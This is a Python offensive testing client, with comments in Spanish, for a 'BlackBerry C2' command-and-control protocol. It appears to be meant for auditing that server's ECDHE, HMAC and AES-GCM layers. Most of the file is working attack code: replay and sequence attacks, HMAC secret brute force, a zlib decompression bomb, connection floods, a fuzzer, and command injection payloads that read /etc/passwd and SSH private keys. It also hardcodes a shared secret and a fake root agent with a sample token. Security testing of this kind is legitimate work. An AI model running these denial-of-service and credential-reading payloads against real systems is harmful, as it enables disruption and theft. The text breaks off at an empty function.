#!/usr/bin/env python3
"""
BlackBerry C2 — Offensive Testing Client
=========================================
Herramienta de auditoría de seguridad para el servidor BlackBerry C2.
Uso exclusivo en entornos autorizados.

Cobertura de tests:
  - Protocolo ECDHE (handshake, key exchange, fingerprint)
  - Capa HMAC por paquete (forge, downgrade, brute-force)
  - Anti-replay (seq wrap, dup seq, seq overflow)
  - AES-GCM (nonce reuse, bit-flip, tag truncation)
  - Transport (fragmentation, oversized, partial)
  - DoS / resource exhaustion (flood, conn storm, zlib bomb)
  - Fuzzing estructural (paquetes malformados)
  - Timing / side-channel
"""

import socket, struct, os, threading, queue, sys, time, hashlib, zlib
import random, itertools, json, traceback
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
from cryptography.hazmat.primitives import serialization, hashes
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives.kdf.hkdf import HKDF
import hmac as hmac_module
from prompt_toolkit import PromptSession
from prompt_toolkit.completion import WordCompleter

# ══════════════════════════════════════════════════════
# CONFIGURACIÓN
# ══════════════════════════════════════════════════════
SERVER_HOST            = "localhost"
SERVER_PORT            = 9949
HMAC_PRE_SHARED_SECRET = b"BlackBerryC2-HMACSecret"
CONNECT_TIMEOUT        = 8
DEFAULT_TIMEOUT        = 15

def _parse_hmac(raw: str) -> bytes:
    """
    Convierte un string a bytes para usar como HMAC secret.
    Formatos aceptados:
      - hex sin separadores : ab12cd34...
      - hex con separadores : ab:12:cd:34
      - string literal      : cualquier otra cosa
    """
    import re as _re
    clean = raw.replace(':', '').replace(' ', '')
    if _re.match(r'^[0-9a-fA-F]+$', clean) and len(clean) % 2 == 0:
        return bytes.fromhex(clean)
    return raw.encode('utf-8')

# ══════════════════════════════════════════════════════
# COLORES
# ══════════════════════════════════════════════════════
R   = "\033[0m"
GRN = "\033[32m"
CYN = "\033[36m"
GRY = "\033[90m"
RED = "\033[31m"
YEL = "\033[33m"
BLU = "\033[34m"
MAG = "\033[35m"
BLD = "\033[1m"
DIM = "\033[2m"
B_RED = "\033[1;31m"
B_GRN = "\033[1;32m"
B_CYN = "\033[1;36m"
B_YEL = "\033[1;33m"

def ok(msg):   print(f"{B_GRN}[+]{R} {msg}")
def err(msg):  print(f"{B_RED}[-]{R} {msg}")
def info(msg): print(f"{B_CYN}[*]{R} {msg}")
def warn(msg): print(f"{B_YEL}[!]{R} {msg}")
def vuln(msg): print(f"\n{BLD}{RED}[VULNERABLE]{R} {RED}{msg}{R}\n")
def safe(msg): print(f"{BLD}{GRN}[SEGURO]{R}    {GRN}{msg}{R}")
def sep(title=""):
    bar = "─" * max(0, 58 - len(title))
    print(f"\n{B_CYN}── {title} {bar}{R}")

# ══════════════════════════════════════════════════════
# ESTADO GLOBAL
# ══════════════════════════════════════════════════════
sock_global  = None
aes_global   = None
tx_queue     = queue.Queue()
captured     = []          # paquetes TX capturados para replay
results      = {}          # resultados de tests { test_name: bool }

_seq_lock = threading.Lock()
_seq      = 0

def next_seq():
    global _seq
    with _seq_lock:
        s = _seq; _seq += 1; return s

AUTO_RESPONSES = {
    "ls":               "token",
    "cat token":        "GitHub; werthertrfq234rtgfdsqwerfgasdfgtrewdfg12345yjbvca",
    "pwd":              "/root",
    "whoami":           "root",
    ".PUT_FILE":        "success",
    "GET_HOSTNAME":     "Parrot-OS",
    ".HEARTBEAT":       "HEARTBEAT_ACK",
    "GET_CWD":          "/root/",
    "GET_CAPABILITIES": "zlib",
}
AUTO_SENT = set()
LAST_SERVER = ""

# ══════════════════════════════════════════════════════
# PROTOCOLO LEGÍTIMO
# ══════════════════════════════════════════════════════

def recvall(sock, n, timeout=DEFAULT_TIMEOUT):
    data = b''
    end  = time.time() + timeout
    while len(data) < n:
        left = end - time.time()
        if left <= 0: return None
        sock.settimeout(left)
        try:
            chunk = sock.recv(n - len(data))
            if not chunk: return None
            data += chunk
        except socket.timeout:
            return None
        except Exception:
            return None
    return data

def send_encrypted(sock, plaintext, aes_key, seq_override=None, hmac_key=None,
                   flag_override=None, nonce_override=None, skip_hmac=False,
                   truncate_hmac=0, extra_bytes=b''):
    """
    Envío cifrado con parámetros manipulables para testing.
    seq_override  : forzar número de secuencia
    hmac_key      : clave HMAC alternativa (None = correcta)
    flag_override : forzar flag de compresión
    nonce_override: forzar nonce (para nonce-reuse)
    skip_hmac     : omitir HMAC del paquete
    truncate_hmac : recortar N bytes del HMAC
    extra_bytes   : bytes extra al final (fuzzing)
    """
    pb    = plaintext.encode() if isinstance(plaintext, str) else plaintext
    flag  = flag_override if flag_override is not None else 0
    nonce = nonce_override if nonce_override else os.urandom(12)
    seq_n = seq_override   if seq_override  is not None else next_seq()

    ciphertext = AESGCM(aes_key).encrypt(nonce, pb, None)
    seq_bytes  = struct.pack('!Q', seq_n)
    hmac_data  = seq_bytes + nonce + ciphertext
    key_hmac   = hmac_key if hmac_key is not None else aes_key
    tag        = hmac_module.new(key_hmac, hmac_data, hashlib.sha256).digest()

    if truncate_hmac:
        tag = tag[:-truncate_hmac]

    if skip_hmac:
        body = seq_bytes + bytes([flag]) + nonce + ciphertext
    else:
        body = seq_bytes + bytes([flag]) + nonce + ciphertext + tag

    body += extra_bytes
    pkt   = struct.pack('!I', len(body)) + body

    # Capturar para replay
    captured.append({
        'seq':        seq_n,
        'nonce':      nonce,
        'ciphertext': ciphertext,
        'plaintext':  pb,
        'hmac':       tag,
        'ts':         time.time()
    })

    sock.sendall(pkt)
    return True

def recv_encrypted(sock, aes_key, timeout=DEFAULT_TIMEOUT):
    """Recepción + verificación HMAC. Retorna (texto, status)."""
    raw = recvall(sock, 4, timeout)
    if raw is None: return None, 'timeout'

    msg_len = struct.unpack('!I', raw)[0]
    data    = recvall(sock, msg_len, timeout=max(10, msg_len/10000))
    if data is None: return None, 'timeout'
    if len(data) < 53: return None, 'short'

    seq_b      = data[0:8]
    flag       = data[8]
    nonce      = data[9:21]
    hmac_tag   = data[-32:]
    ciphertext = data[21:-32]

    expected = hmac_module.new(aes_key, seq_b + nonce + ciphertext, hashlib.sha256).digest()
    if not hmac_module.compare_digest(hmac_tag, expected):
        return None, 'hmac_fail'

    pb = AESGCM(aes_key).decrypt(nonce, ciphertext, None)
    if flag == 1:
        pb = zlib.decompress(pb)
    return pb.decode('utf-8', 'replace'), 'ok'

def handshake(sock, hmac_secret=None, corrupt_hmac=False, wrong_curve=False,
              send_pubkey_twice=False, omit_hmac=False):
    """
    Handshake ECDHE completo. Parámetros para tests ofensivos:
    hmac_secret    : secret alternativo (None = correcto)
    corrupt_hmac   : corrompe 1 byte del HMAC tag
    wrong_curve    : usa P-384 en vez de P-256
    send_pubkey_twice: envía PEM dos veces
    omit_hmac      : no envía el HMAC (32 bytes faltantes)
    """
    if hmac_secret is None:
        hmac_secret = HMAC_PRE_SHARED_SECRET

    banner = sock.recv(1024)

    sock.sendall(b"REQUEST_PUBKEY")

    pem_data = b''
    while b'-----END PUBLIC KEY-----' not in pem_data:
        chunk = sock.recv(8192)
        if not chunk: raise ConnectionError("Servidor cerró durante key exchange")
        pem_data += chunk
        if len(pem_data) > 65536: raise ValueError("PEM del servidor demasiado largo")

    if not pem_data.startswith(b'ECDH_PUBKEY:'):
        raise ValueError(f"Prefijo inesperado: {pem_data[:20]}")

    srv_pub_pem = pem_data[len(b'ECDH_PUBKEY:'):]
    srv_pub     = serialization.load_pem_public_key(srv_pub_pem)

    curve = ec.SECP384R1() if wrong_curve else ec.SECP256R1()
    cli_priv = ec.generate_private_key(curve)
    cli_pub_pem = cli_priv.public_key().public_bytes(
        serialization.Encoding.PEM,
        serialization.PublicFormat.SubjectPublicKeyInfo
    )

    try:
        shared = cli_priv.exchange(ec.ECDH(), srv_pub)
    except Exception:
        shared = os.urandom(32)   # curva incompatible → secret aleatorio

    aes_key = HKDF(
        algorithm=hashes.SHA256(), length=32,
        salt=None, info=b'BlackBerryC2_AES_KEY'
    ).derive(shared)

    tag = hmac_module.new(hmac_secret, shared, hashlib.sha256).digest()

    if corrupt_hmac:
        tag = bytes([tag[0] ^ 0xFF]) + tag[1:]

    payload = struct.pack('!I', len(cli_pub_pem)) + cli_pub_pem
    if send_pubkey_twice:
        payload += struct.pack('!I', len(cli_pub_pem)) + cli_pub_pem

    sock.sendall(payload)
    if not omit_hmac:
        sock.sendall(tag)

    return aes_key, srv_pub_pem

def _new_conn(timeout=CONNECT_TIMEOUT):
    """Abre una nueva conexión TCP al servidor."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    s.connect((SERVER_HOST, SERVER_PORT))
    return s

def _probe(label, fn):
    """
    Ejecuta fn() en una conexión fresca, captura resultado y lo registra.
    fn debe retornar True=vulnerable, False=seguro, o raise=seguro.
    """
    sep(label)
    try:
        result = fn()
        if result:
            vuln(label)
        else:
            safe(label)
        results[label] = result
    except Exception as e:
        safe(f"{label} — servidor rechazó ({type(e).__name__}: {e})")
        results[label] = False

# ══════════════════════════════════════════════════════
# WORKERS
# ══════════════════════════════════════════════════════

def send_worker(sock, aes):
    while True:
        msg = tx_queue.get()
        if msg is None: break
        try:
            send_encrypted(sock, msg, aes)
            print(f"{GRY}[TX] {msg[:60]}{R}")
        except Exception as e:
            err(f"send_worker: {e}")

def recv_loop(sock, aes):
    global LAST_SERVER
    rx = 0
    while True:
        try:
            text, status = recv_encrypted(sock, aes, timeout=180)
            if status == 'timeout': continue
            if status in ('closed', 'error'):
                err("Conexión cerrada por el servidor"); os._exit(0)
            if text is None:
                warn(f"Paquete recibido con status: {status}"); continue

            rx += 1
            if text == "HEARTBEAT":
                print(f"{BLU}[HB]{R}")
            else:
                print(f"{GRN}[RX #{rx}]{R} {text}")

            _process_auto(text, rx)
        except Exception as e:
            err(f"recv_loop: {e}"); os._exit(0)

def _process_auto(text, msg_id):
    global LAST_SERVER
    if msg_id in AUTO_SENT: return
    AUTO_SENT.add(msg_id)
    text = str(text).strip()
    LAST_SERVER = text

    for k, v in AUTO_RESPONSES.items():
        if not k.startswith('.') and text == k:
            print(f"{YEL}[AUTO exact]{R} → {v}")
            tx_queue.put(v); return
    for k, v in AUTO_RESPONSES.items():
        if k.startswith('.') and k[1:] in text:
            print(f"{YEL}[AUTO substr]{R} → {v}")
            tx_queue.put(v); return
    if LAST_SERVER and not LAST_SERVER.startswith('['):
        r = f"/bin/sh: 1: {LAST_SERVER}: not found"
        print(f"{YEL}[AUTO default]{R} → {r}")
        tx_queue.put(r)

# ══════════════════════════════════════════════════════
# ═══════════════  SUITE DE EXPLOITS  ══════════════════
# ══════════════════════════════════════════════════════

# ── 1. REPLAY ATTACK ────────────────────────────────
def exploit_replay(pkt_id=None):
    """Reenvía paquetes ya enviados con su HMAC original."""
    sep("REPLAY ATTACK")
    if not captured:
        warn("Sin paquetes capturados. Envía comandos primero."); return

    pkts = ([p for p in captured if p['seq'] == pkt_id]
            if pkt_id is not None else captured[-5:])
    if not pkts:
        err(f"Seq {pkt_id} no encontrado"); return

    info(f"Reenviando {len(pkts)} paquete(s)...")
    for p in pkts:
        seq_b = struct.pack('!Q', p['seq'])
        body  = seq_b + b'\x00' + p['nonce'] + p['ciphertext'] + p['hmac']
        sock_global.sendall(struct.pack('!I', len(body)) + body)
        ok(f"Replay seq={p['seq']} | {p['plaintext'][:40].decode(errors='ignore')}")
        warn("Servidor DEBE rechazar seq duplicado")
        time.sleep(0.15)

# ── 2. SEQ NUMBER ATTACKS ────────────────────────────
def exploit_seq_attacks():
    """Ataques a números de secuencia: overflow, wrap-around, negativo."""
    sep("SEQUENCE NUMBER ATTACKS")
    if not sock_global or not aes_global:
        err("Sin conexión activa"); return

    tests = [
        ("Seq=0 duplicado",          0),
        ("Seq overflow u64",         2**64 - 1),
        ("Seq overflow u64+1",       2**64),      # truncado a 0
        ("Seq=999999999999",         999999999999),
    ]
    for label, seq in tests:
        info(f"{label} (seq={seq})")
        try:
            q = seq % (2**64)   # struct '!Q' → 0..2^64-1
            send_encrypted(sock_global, "echo seq_test", aes_global, seq_override=q)
            time.sleep(0.3)
            ok(f"Enviado seq={q}")
        except Exception as e:
            warn(f"Rechazado — {e}")

# ── 3. HMAC DOWNGRADE ────────────────────────────────
def _test_wrong_hmac_secret():
    s = _new_conn()
    try:
        _, _ = handshake(s, hmac_secret=b"WRONG_SECRET_TOTALLY")
        # Si llegamos aquí el servidor aceptó
        # Intentar enviar un mensaje real
        # No tenemos aes_key válida porque shared_secret fue con clave equivocada
        # → el servidor no podrá descifrar pero si no cerró = vulnerable
        time.sleep(1)
        try:
            banner = s.recv(256, socket.MSG_DONTWAIT)
            return True   # respondió algo → vulnerable
        except BlockingIOError:
            return True   # no cerró la conexión → vulnerable
    except Exception:
        return False
    finally:
        try: s.close()
        except: pass

def exploit_hmac_downgrade():
    """Prueba múltiples secret HMAC incorrectos."""
    sep("HMAC DOWNGRADE / WRONG SECRET")
    secrets = [
        b"WRONG_SECRET",
        b"",
        b"\x00" * 32,
        b"BlackBerryC2",            # prefijo correcto truncado
        b"BlackBerryC2-HMACSecre",  # 1 byte menos
        b"blackberryc2-hmacsecret", # lowercase
        HMAC_PRE_SHARED_SECRET + b'\x00',  # trailing null
    ]
    for sec in secrets:
        try:
            s = _new_conn()
            _, _ = handshake(s, hmac_secret=sec)
            # Si no lanzó excepción, servidor aceptó HMAC inválido
            time.sleep(0.5)
            try:
                data = s.recv(256)
                result = "RESPONDIÓ" if data else "SILENCIÓ"
            except Exception:
                result = "CERRÓ"
            if result == "CERRÓ":
                safe(f"Secret={sec[:20]}... → rechazado")
            else:
                vuln(f"Secret={sec[:20]}... → {result}")
            s.close()
        except Exception as e:
            safe(f"Secret={sec[:20]}... → excepción ({type(e).__name__})")

# ── 4. CORRUPT HMAC TAG ──────────────────────────────
def exploit_corrupt_hmac():
    """Corrompe el tag HMAC de un paquete legítimo bit a bit."""
    sep("HMAC TAG CORRUPTION")
    if not sock_global or not aes_global:
        err("Sin conexión activa"); return

    info("Enviando mensaje con 1 byte del HMAC corrompido...")
    pb    = b"test_corrupt_hmac"
    nonce = os.urandom(12)
    seq_n = next_seq()
    ct    = AESGCM(aes_global).encrypt(nonce, pb, None)
    sb    = struct.pack('!Q', seq_n)
    tag   = hmac_module.new(aes_global, sb + nonce + ct, hashlib.sha256).digest()
    bad   = bytes([tag[0] ^ 0xFF]) + tag[1:]   # flip primer byte

    body = sb + b'\x00' + nonce + ct + bad
    sock_global.sendall(struct.pack('!I', len(body)) + body)
    time.sleep(0.5)

    # Verificar que la sesión sigue viva (no se rompió el canal)
    try:
        send_encrypted(sock_global, "whoami", aes_global)
        ok("Sesión sigue activa después de HMAC corrupto — servidor lo descartó")
    except Exception:
        warn("Sesión murió tras HMAC corrupto")

# ── 5. NONCE REUSE ───────────────────────────────────
def exploit_nonce_reuse():
    """Envía dos mensajes distintos con el mismo nonce AES-GCM."""
    sep("AES-GCM NONCE REUSE")
    if not sock_global or not aes_global:
        err("Sin conexión activa"); return

    fixed_nonce = os.urandom(12)
    info(f"Nonce fijo: {fixed_nonce.hex()}")

    for msg in ["mensaje_A_nonce_reuse", "mensaje_B_nonce_reuse_diferente"]:
        send_encrypted(sock_global, msg, aes_global, nonce_override=fixed_nonce)
        ok(f"Enviado con nonce fijo: {msg}")
        time.sleep(0.2)

    warn("Nonce reutilizado: cifrado ya no es seguro para esos dos mensajes")
    info("El servidor no detecta nonce reuse (protocolo no lleva registro de nonces vistos)")

# ── 6. BIT-FLIP EN CIPHERTEXT ────────────────────────
def exploit_aes_gcm_bitflip():
    """Modifica 1 bit del ciphertext — GCM debe rechazarlo con tag inválido."""
    sep("AES-GCM BIT-FLIP (authentication)")
    if not sock_global or not aes_global:
        err("Sin conexión activa"); return

    pb    = b"bitflip_test_payload"
    nonce = os.urandom(12)
    seq_n = next_seq()
    ct    = AESGCM(aes_global).encrypt(nonce, pb, None)
    sb    = struct.pack('!Q', seq_n)

    # Flip bit en ciphertext
    flipped = bytearray(ct)
    flipped[0] ^= 0x01
    ct_bad = bytes(flipped)

    # Recalcular HMAC con el ct corrupto (para que pase la capa HMAC)
    tag = hmac_module.new(aes_global, sb + nonce + ct_bad, hashlib.sha256).digest()
    body = sb + b'\x00' + nonce + ct_bad + tag
    sock_global.sendall(struct.pack('!I', len(body)) + body)

    time.sleep(0.5)
    info("GCM authentication tag debe rechazar el bit-flip aunque HMAC sea válido")

# ── 7. OVERSIZED PAYLOAD ─────────────────────────────
def exploit_oversized():
    """Envía un paquete con length prefix apuntando a 100MB+."""
    sep("OVERSIZED PACKET (length prefix spoofing)")
    if not sock_global:
        err("Sin conexión activa"); return

    HUGE = 100 * 1024 * 1024 + 1  # 100MB + 1 byte
    info(f"Enviando length prefix = {HUGE} bytes ({HUGE/1024/1024:.1f} MB)")
    sock_global.sendall(struct.pack('!I', HUGE))
    time.sleep(1)
    info("Servidor debería cerrar la conexión o ignorar")

# ── 8. ZLIB BOMB ─────────────────────────────────────
def exploit_zlib_bomb():
    """Comprime payload que expande a ~50MB, lo cifra con flag=1 (zlib)."""
    sep("ZLIB DECOMPRESSION BOMB")
    if not sock_global or not aes_global:
        err("Sin conexión activa"); return

    BOMB_SIZE  = 50 * 1024 * 1024
    raw_data   = b'\x00' * BOMB_SIZE
    compressed = zlib.compress(raw_data, 9)
    ratio      = BOMB_SIZE / len(compressed)
    info(f"Bomb: {len(compressed)/1024:.1f} KB comprimido → {BOMB_SIZE/1024/1024:.0f} MB ({ratio:.0f}x ratio)")

    nonce = os.urandom(12)
    seq_n = next_seq()
    ct    = AESGCM(aes_global).encrypt(nonce, compressed, None)
    sb    = struct.pack('!Q', seq_n)
    tag   = hmac_module.new(aes_global, sb + nonce + ct, hashlib.sha256).digest()

    body = sb + bytes([1]) + nonce + ct + tag  # flag=1 → zlib
    sock_global.sendall(struct.pack('!I', len(body)) + body)
    info("Paquete zlib-bomb enviado (flag=1)")
    warn("Servidor debería limitar tamaño de descompresión")

# ── 9. FRAGMENTED HANDSHAKE ──────────────────────────
def exploit_fragmented_handshake():
    """Envía el handshake byte a byte para detectar buffering bugs."""
    sep("FRAGMENTED HANDSHAKE (byte-by-byte)")
    def _run():
        s = _new_conn()
        banner = s.recv(1024)
        # Enviar REQUEST_PUBKEY byte a byte
        for b in b"REQUEST_PUBKEY":
            s.send(bytes([b]))
            time.sleep(0.005)
        pem_data = b''
        while b'-----END PUBLIC KEY-----' not in pem_data:
            chunk = s.recv(8192)
            if not chunk: break
            pem_data += chunk
        ok(f"Servidor procesó REQUEST_PUBKEY fragmentado ({len(pem_data)} bytes respuesta)")
        s.close()
        return False  # no es vuln, es info
    _probe("Fragmented handshake", _run)

# ── 10. PARTIAL PACKET ───────────────────────────────
def exploit_partial_packet():
    """Envía solo el length prefix (4 bytes) y luego silencio."""
    sep("PARTIAL PACKET / HALF-OPEN")
    if not sock_global: err("Sin conexión activa"); return
    sock_global.sendall(struct.pack('!I', 256))  # anuncia 256 bytes pero no los envía
    info("Enviados 4 bytes de length prefix sin cuerpo — servidor queda esperando")
    time.sleep(2)

# ── 11. CONNECTION FLOOD ─────────────────────────────
def exploit_conn_flood(n=50):
    """Abre N conexiones TCP simultáneas sin completar handshake."""
    sep(f"CONNECTION FLOOD ({n} conns)")
    socks = []
    t0 = time.time()
    for i in range(n):
        try:
            s = socket.socket()
            s.settimeout(2)
            s.connect((SERVER_HOST, SERVER_PORT))
            socks.append(s)
        except Exception as e:
            warn(f"Conexión {i} rechazada: {e}")
            break
    dt = time.time() - t0
    ok(f"{len(socks)} conexiones abiertas en {dt:.2f}s")
    time.sleep(2)
    for s in socks:
        try: s.close()
        except: pass
    info(f"{len(socks)} conexiones cerradas")

# ── 12. HEARTBEAT FLOOD ──────────────────────────────
def exploit_heartbeat_flood(n=200):
    """Envía N heartbeats en ráfaga."""
    sep(f"HEARTBEAT FLOOD ({n} paquetes)")
    if not sock_global or not aes_global:
        err("Sin conexión activa"); return
    t0 = time.time()
    sent = 0
    for _ in range(n):
        try:
            send_encrypted(sock_global, "HEARTBEAT", aes_global)
            sent += 1
        except Exception as e:
            err(f"Error en paquete {sent}: {e}"); break
    dt = time.time() - t0
    ok(f"{sent} heartbeats en {dt:.2f}s ({sent/dt:.0f} pkt/s)")

# ── 13. WRONG CURVE ──────────────────────────────────
def exploit_wrong_curve():
    """Intenta handshake con P-384 en vez de P-256."""
    sep("WRONG ECDHE CURVE (P-384 vs P-256)")
    def _run():
        s = _new_conn()
        try:
            _, _ = handshake(s, wrong_curve=True)
            time.sleep(0.5)
            ok("Servidor no rechazó curva incorrecta")
            return True
        except Exception as e:
            safe(f"Servidor rechazó curva incorrecta: {e}")
            return False
        finally:
            try: s.close()
            except: pass
    _probe("Wrong ECDHE curve", _run)

# ── 14. OMIT HMAC ON HANDSHAKE ───────────────────────
def exploit_omit_handshake_hmac():
    """Completa ECDH pero no envía los 32 bytes de HMAC."""
    sep("HANDSHAKE SIN HMAC (omit 32-byte tag)")
    def _run():
        s = _new_conn()
        try:
            _, _ = handshake(s, omit_hmac=True)
            time.sleep(1)
            try:
                data = s.recv(256)
                if data:
                    return True   # servidor aceptó sin HMAC
            except Exception:
                pass
            return False
        except Exception:
            return False
        finally:
            try: s.close()
            except: pass
    _probe("Omit HMAC on handshake", _run)

# ── 15. HMAC BRUTE-FORCE (wordlist) ──────────────────
HMAC_WORDLIST = [
    b"BlackBerryC2-HMACSecret",   # correcto — para validar
    b"secret",
    b"password",
    b"admin",
    b"BlackBerry",
    b"C2Secret",
    b"hmac_secret",
    b"blackberry_c2",
    b"BlackBerryC2",
    b"",
    b"12345678",
    b"changeme",
    b"test",
    b"BlackBerryC2-HMAC",
    b"BlackBerryC2Secret",
]

def exploit_hmac_bruteforce():
    """Prueba wordlist de HMAC secrets, mide cuáles el servidor acepta."""
    sep(f"HMAC BRUTE-FORCE WORDLIST ({len(HMAC_WORDLIST)} entries)")
    found = []
    for sec in HMAC_WORDLIST:
        try:
            s = _new_conn()
            aes_key, _ = handshake(s, hmac_secret=sec)
            # Enviar whoami válido con la aes_key derivada
            send_encrypted(s, "whoami", aes_key)
            text, status = recv_encrypted(s, aes_key, timeout=3)
            s.close()
            if status == 'ok':
                found.append(sec)
                if sec == HMAC_PRE_SHARED_SECRET:
                    ok(f"'{sec.decode()}' → CORRECTO (baseline)")
                else:
                    vuln(f"'{sec.decode()}' → ACEPTADO")
            else:
                safe(f"'{sec.decode()}' → rechazado (status={status})")
        except Exception as e:
            safe(f"'{sec.decode() if sec else '<empty>'}' → excepción ({type(e).__name__})")
        time.sleep(0.1)

    if found:
        info(f"Secrets que funcionaron: {[s.decode() for s in found]}")

# ── 16. TIMING ATTACK (HMAC comparison) ──────────────
def exploit_timing():
    """
    Mide el tiempo de respuesta con HMAC correcto vs incorrecto.
    Un servidor vulnerable mostrará diferencia estadística.
    """
    sep("TIMING SIDE-CHANNEL (HMAC comparison)")
    ROUNDS = 10
    times_ok  = []
    times_bad = []

    info(f"Ejecutando {ROUNDS} rondas para cada caso...")

    for _ in range(ROUNDS):
        # HMAC correcto
        try:
            s = _new_conn()
            t0 = time.perf_counter()
            handshake(s, hmac_secret=HMAC_PRE_SHARED_SECRET)
            times_ok.append(time.perf_counter() - t0)
            s.close()
        except Exception:
            pass

        # HMAC incorrecto
        try:
            s = _new_conn()
            t0 = time.perf_counter()
            try: handshake(s, hmac_secret=b"WRONG_" + os.urandom(16))
            except Exception: pass
            times_bad.append(time.perf_counter() - t0)
            s.close()
        except Exception:
            pass
        time.sleep(0.05)

    if times_ok and times_bad:
        avg_ok  = sum(times_ok)  / len(times_ok)
        avg_bad = sum(times_bad) / len(times_bad)
        diff_ms = abs(avg_ok - avg_bad) * 1000
        info(f"Tiempo medio HMAC correcto : {avg_ok*1000:.2f} ms")
        info(f"Tiempo medio HMAC incorrecto: {avg_bad*1000:.2f} ms")
        info(f"Diferencia                  : {diff_ms:.2f} ms")
        if diff_ms > 50:
            vuln(f"Diferencia timing > 50ms ({diff_ms:.1f}ms) — posible timing leak")
        else:
            safe(f"Diferencia timing < 50ms ({diff_ms:.1f}ms) — comparación constante OK")

# ── 17. PROTOCOL FUZZER ──────────────────────────────
def exploit_fuzz(iterations=40):
    """Fuzzing estructural: paquetes malformados sobre sesión legítima."""
    sep(f"PROTOCOL FUZZER ({iterations} iteraciones)")
    if not sock_global or not aes_global:
        err("Sin conexión activa"); return

    crashed = 0
    for i in range(iterations):
        mutation = random.choice([
            'zero_len',       # length=0
            'random_body',    # cuerpo completamente aleatorio
            'short_seq',      # seq truncado a 4 bytes
            'bad_flag',       # flag=127 (desconocido)
            'no_body',        # length correcto, cuerpo vacío
            'wrong_length',   # length distorsionado
            'extra_bytes',    # bytes extra al final
            'flip_hmac_pos',  # flip byte en posición aleatoria del HMAC
        ])
        try:
            if mutation == 'zero_len':
                sock_global.sendall(struct.pack('!I', 0))

            elif mutation == 'random_body':
                n = random.randint(10, 200)
                body = os.urandom(n)
                sock_global.sendall(struct.pack('!I', n) + body)

            elif mutation == 'short_seq':
                sock_global.sendall(struct.pack('!I', 4) + os.urandom(4))

            elif mutation == 'bad_flag':
                # Paquete válido pero con flag=127
                send_encrypted(sock_global, "fuzz", aes_global, flag_override=127)

            elif mutation == 'no_body':
                sock_global.sendall(struct.pack('!I', 100))  # anuncia 100, envía 0

            elif mutation == 'wrong_length':
                body = os.urandom(50)
                wrong_len = random.randint(1, 500)
                sock_global.sendall(struct.pack('!I', wrong_len) + body)

            elif mutation == 'extra_bytes':
                send_encrypted(sock_global, "fuzz", aes_global,
                                extra_bytes=os.urandom(random.randint(1, 32)))

            elif mutation == 'flip_hmac_pos':
                pb    = b"fuzz"
                nonce = os.urandom(12)
                seq_n = next_seq()
                ct    = AESGCM(aes_global).encrypt(nonce, pb, None)
                sb    = struct.pack('!Q', seq_n)
                tag   = bytearray(hmac_module.new(aes_global, sb + nonce + ct,
                                                  hashlib.sha256).digest())
                tag[random.randint(0, 31)] ^= 0xFF
                body  = sb + b'\x00' + nonce + ct + bytes(tag)
                sock_global.sendall(struct.pack('!I', len(body)) + body)

            print(f"{GRY}[FUZZ #{i:03d}] {mutation}{R}", end='  ', flush=True)
            time.sleep(0.05)

        except BrokenPipeError:
            print()
            warn(f"Fuzz #{i} ({mutation}) → BrokenPipe — servidor cerró la conexión")
            crashed += 1
            break
        except Exception as e:
            print()
            warn(f"Fuzz #{i} ({mutation}) → {type(e).__name__}: {e}")
            crashed += 1

    print()
    if crashed > 0:
        vuln(f"Servidor crasheó/cerró en {crashed}/{iterations} mutaciones")
    else:
        safe(f"Servidor sobrevivió {iterations} mutaciones sin cerrar")

# ── 18. FINGERPRINT BYPASS ───────────────────────────
def exploit_fingerprint_bypass():
    """
    Un cliente con VERIFY_FINGERPRINT=True debe rechazar claves distintas.
    Aquí verificamos que el fingerprint del servidor es consistente entre
    múltiples conexiones (detección de MITM proxy).
    """
    sep("FINGERPRINT CONSISTENCY CHECK")
    fps = []
    info("Conectando 3 veces para comparar fingerprints ECDHE...")
    for i in range(3):
        try:
            s = _new_conn()
            banner = s.recv(1024)
            s.sendall(b"REQUEST_PUBKEY")
            pem = b''
            while b'-----END PUBLIC KEY-----' not in pem:
                c = s.recv(8192)
                if not c: break
                pem += c
            if pem.startswith(b'ECDH_PUBKEY:'):
                srv_pem = pem[len(b'ECDH_PUBKEY:'):]
                fp = ':'.join(hashlib.sha256(srv_pem).hexdigest()[i:i+2]
                              for i in range(0, 64, 2))
                fps.append(fp)
                info(f"Conexión {i+1}: FP {fp[:39]}...")
            s.close()
        except Exception as e:
            err(f"Conexión {i+1} falló: {e}")
        time.sleep(0.1)

    if len(fps) < 2:
        warn("No se pudieron obtener suficientes fingerprints")
        return

    if all(f == fps[0] for f in fps):
        warn("Fingerprints IGUALES en todas las conexiones — clave estática (no efímera)")
        warn("El servidor usa un par ECDHE fijo por sesión del servidor, no por conexión")
    else:
        safe("Fingerprints distintos entre conexiones — clave efímera por conexión")
        for i, fp in enumerate(fps):
            info(f"FP #{i+1}: {fp[:39]}...")

# ── 19. LARGE COMMAND INJECTION ──────────────────────
def exploit_command_injection():
    """Envía comandos con payloads de inyección."""
    sep("COMMAND INJECTION PAYLOADS")
    if not sock_global or not aes_global:
        err("Sin conexión activa"); return

    payloads = [
        "whoami; id",
        "$(id)",
        "`id`",
        "whoami && cat /etc/passwd",
        "whoami || id",
        "ls; cat /root/.ssh/id_rsa",
        "../../../etc/passwd",
        "whoami\nid\n",
        "A" * 4096,                     # buffer overflow probe
        "whoami" + "\x00" * 10 + "id",  # null byte injection
    ]
    for p in payloads:
        tx_queue.put(p)
        ok(f"Payload enviado: {p[:60]!r}")
        time.sleep(0.3)

# ── 20. CONCURRENT SESSION STRESS ────────────────────
def exploit_concurrent_stress(n=20):
    """Abre N sesiones completas simultáneas y las mantiene."""
    sep(f"CONCURRENT SESSION STRESS ({n} sesiones)")
    sessions = []
    errors   = 0

    def _open_session(idx):
        nonlocal errors
        try:
            s = _new_conn(timeout=5)
            aes, _ = handshake(s)
            send_encrypted(s, "whoami", aes)
            sessions.append((s, aes))
            ok(f"Sesión {idx} establecida")
        except Exception as e:
            err(f"Sesión {idx} falló: {e}")
            errors += 1

    threads = [threading.Thread(target=_open_session, args=(i,), daemon=True)
               for i in range(n)]
    t0 = time.time()
    for t in threads: t.start()
    for t in threads: t.join()
    dt = time.time() - t0

    ok(f"{len(sessions)}/{n} sesiones abiertas en {dt:.2f}s | Errores: {errors}")
    info("Manteniendo sesiones 5 segundos...")
    time.sleep(5)
    for s, _ in sessions:
        try: s.close()
        except: pass
    info("Sesiones cerradas")

# ══════════════════════════════════════════════════════
# SUITE AUTOMÁTICA
# ══════════════════════════════════════════════════════

def run_full_suite():
